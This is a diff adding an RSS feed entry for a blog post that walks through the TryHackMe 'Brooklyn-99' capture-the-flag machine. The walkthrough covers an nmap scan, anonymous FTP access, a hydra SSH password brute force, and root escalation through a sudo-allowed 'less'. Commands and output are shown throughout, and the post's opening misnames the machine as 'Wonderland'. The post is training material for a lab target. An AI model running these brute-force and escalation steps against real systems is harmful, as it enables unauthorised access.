@@ -228,6 +228,226 @@ THM{REDACTED}
         </item>
         
         <item>
+            <title>Tryhackme- Brooklyn-99 Writeup</title>
+            <link>https://0xSh1v4.github.io/posts/2020/09/tryhackme-brooklyn-99-writeup/</link>
+            <pubDate>Wed, 16 Sep 2020 00:00:00 +0000</pubDate>
+            
+            <guid>https://0xSh1v4.github.io/posts/2020/09/tryhackme-brooklyn-99-writeup/</guid>
+            <description>The following write up is for the machine: Wonderland
+Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.</description>
+            <content type="html"><![CDATA[<p>The following write up is for the machine: Wonderland</p>
+<p><a href="https://www.tryhackme.com">Tryhackme</a> is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.</p>
+<h2 id="synopsis">Synopsis</h2>
+<p><a href="https://www.tryhackme.com/room/brooklynninenine">Brooklyn99</a> is the very easy boot2root machine where we need to find two flags in the machine. Basic enumeration and simple exploitation technique of weak password gives you access to the server and later easy escaltion to root could be done by multiple methods.</p>
+<h2 id="scanning-and-enumeration-the-network">Scanning and Enumeration the network</h2>
+<p>As usual, let us run the nmap tool to can the target network.</p>
+<h3 id="nmap-results">Nmap Results:</h3>
+<p>As usual I tried to run the scan with the following command.</p>
+<pre><code>nmap -sC -sV -oA top 10.10.173.51
+</code></pre><p>We have got the following results.</p>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/brokyln-99]
+└─$ sudo nmap -sC -sV -oA top 10.10.9.59
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-18 23:58 CEST
+Nmap scan report for 10.10.9.59
+Host is up (0.077s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.9.90.133
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
+|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
+|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.01 seconds
+</code></pre><p>From the results, we found the anonymous ftp login is allowed and there is a file present in the system.</p>
+<h3 id="ftp-info">FTP Info</h3>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/brokyln-99]
+└─$ ftp 10.10.9.59     
+Connected to 10.10.9.59.
+220 (vsFTPd 3.0.3)
+Name (10.10.9.59:zeus): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
+226 Directory send OK.
+ftp&gt; get note_to_jake.txt
+local: note_to_jake.txt remote: note_to_jake.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
+226 Transfer complete.
+119 bytes received in 0.00 secs (49.6416 kB/s)
+ftp&gt; exit
+221 Goodbye.
+</code></pre><p>From the text file, we found the following info.</p>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/brokyln-99]
+└─$ cat note_to_jake.txt 
+From Amy,
+
+Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
+</code></pre><p>Port 80 displays the following page:</p>
+<figure>
+    <img src="/Tryhackme/Brook/1.png"
+         alt="Tryhackme: Brooklyn-99 machine - Port-80 Page"/> <figcaption>
+            <p>Tryhackme: Brooklyn-99 machine - Port-80 Page</p>
+        </figcaption>
+</figure>
+
+<h3 id="dirb-results">Dirb Results:</h3>
+<p>Din&rsquo;t get much from dirb</p>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/brokyln-99]
+└─$ dirb http://10.10.9.59 
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Sep 18 23:59:03 2020
+URL_BASE: http://10.10.9.59/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.9.59/ ----
++ http://10.10.9.59/index.html (CODE:200|SIZE:718)                                                                                                                                                                                           
++ http://10.10.9.59/server-status (CODE:403|SIZE:275)                                                                                                                                                                                        
+                                                                                                                                                                                                                                             
+-----------------
+END_TIME: Sat Sep 19 00:03:36 2020
+DOWNLOADED: 4612 - FOUND: 2
+</code></pre><h2 id="exploiting-the-machine">Exploiting the machine</h2>
+<p>Lets try to brute the user <strong>jake</strong> with the password list (rockyou.txt)using hydra for ssh service.</p>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/brokyln-99]
+└─$ hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.9.59 ssh   
+Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-19 00:04:04
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://10.10.9.59:22/
+[22][ssh] host: 10.10.9.59   login: jake   password: 987654321
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 1 final worker threads did not complete until end.
+[ERROR] 1 target did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-19 00:04:48
+</code></pre><p>Now we got the password. lets login to the machine.</p>
+<p>now lets ssh into the machine.</p>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/brokyln-99]
+└─$ ssh jake@10.10.9.59                                                                                                                                                                                                                 255 ⨯
+The authenticity of host '10.10.9.59 (10.10.9.59)' can't be established.
+ECDSA key fingerprint is SHA256:Ofp49Dp4VBPb3v/vGM9jYfTRiwpg2v28x1uGhvoJ7K4.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.9.59' (ECDSA) to the list of known hosts.
+jake@10.10.9.59's password: 
+Last login: Tue May 26 08:56:58 2020
+jake@brookly_nine_nine:~$ ls
+</code></pre><p>Now, we got the user flag.</p>
+<pre><code>jake@brookly_nine_nine:~$ pwd
+/home/jake
+jake@brookly_nine_nine:~$ cd ..
+jake@brookly_nine_nine:/home$ ls -la
+total 20
+drwxr-xr-x  5 root root 4096 May 18 10:21 .
+drwxr-xr-x 24 root root 4096 May 19 15:17 ..
+drwxr-xr-x  5 amy  amy  4096 May 18 10:23 amy
+drwxr-xr-x  6 holt holt 4096 May 26 09:01 holt
+drwxr-xr-x  6 jake jake 4096 May 26 09:01 jake
+jake@brookly_nine_nine:/home$ cd holt/
+jake@brookly_nine_nine:/home/holt$ ls
+nano.save  user.txt
+jake@brookly_nine_nine:/home/holt$ ls -la
+total 48
+drwxr-xr-x 6 holt holt 4096 May 26 09:01 .
+drwxr-xr-x 5 root root 4096 May 18 10:21 ..
+-rw------- 1 holt holt   18 May 26 09:01 .bash_history
+-rw-r--r-- 1 holt holt  220 May 17 21:42 .bash_logout
+-rw-r--r-- 1 holt holt 3771 May 17 21:42 .bashrc
+drwx------ 2 holt holt 4096 May 18 10:24 .cache
+drwx------ 3 holt holt 4096 May 18 10:24 .gnupg
+drwxrwxr-x 3 holt holt 4096 May 17 21:46 .local
+-rw-r--r-- 1 holt holt  807 May 17 21:42 .profile
+drwx------ 2 holt holt 4096 May 18 14:45 .ssh
+-rw------- 1 root root  110 May 18 17:12 nano.save
+-rw-rw-r-- 1 holt holt   33 May 17 21:49 user.txt
+jake@brookly_nine_nine:/home/holt$ cat user.txt 
+ee1[REDACTED]ee
+</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Lets check what permissions does the user have:</p>
+<pre><code>jake@brookly_nine_nine:/home/holt$ sudo -l
+Matching Defaults entries for jake on brookly_nine_nine:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jake may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /usr/bin/less
+</code></pre><p>So, the user jake can run less with sudo permissions. So, lets go to <a href="https://gtfobins.github.io/gtfobins/less/#sudo">LESS-gtfobins</a></p>
+<pre><code>jake@brookly_nine_nine:/home/holt$ sudo less /etc/profile
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# whoami
+root
+# ls      
+nano.save  user.txt
+# cd /root
+# ls
+root.txt
+# cat root.txt
+-- Creator : Fsociety2006 --
+Congratulations in rooting Brooklyn Nine Nine
+Here is the flag: 63a[REDACTED]845
+
+Enjoy!!
+</code></pre><p>There is also another way to escalate to root, which is using <a href="https://gtfobins.github.io/gtfobins/nano/">gtfobins-NANO</a>. we saw that the file <strong>nano.save</strong> has read/write permissions.</p>
+<p>We could use that to escalate to root. Read more here.</p>
+<p>And thats how we got the root flag. Simple machine and took few minutes to root his box.</p>
+<p>Thanks for reading! Prost! 🍺</p>
+<p>If you have any questions: Feel free to contact me.</p>
+<p>Twitter Profile: <a href="https://twitter.com/Sh1v4_R4jU">https://twitter.com/Sh1v4_R4jU</a></p>
+<p>TryHackMe Profile: <a href="https://tryhackme.com/p/Whiterose">https://tryhackme.com/p/Whiterose</a></p>
+<p>HTB Profile: <a href="https://www.hackthebox.eu/home/users/profile/167190">https://www.hackthebox.eu/home/users/profile/167190</a></p>
+<p><figure>
+    <img src="/HTB_profile.png"
+         alt="HTB_Profile"/> 
+</figure>
+
+<figure>
+    <img src="https://tryhackme-badges.s3.amazonaws.com/Whiterose.png"
+         alt="Tryhackme"/> 
+</figure>
+</p>
+]]></content>
+        </item>
+        
+        <item>
             <title>Tryhackme- Wonderland Writeup</title>
             <link>https://0xSh1v4.github.io/posts/2020/09/tryhackme-wonderland-writeup/</link>
             <pubDate>Sat, 12 Sep 2020 00:00:00 +0000</pubDate>
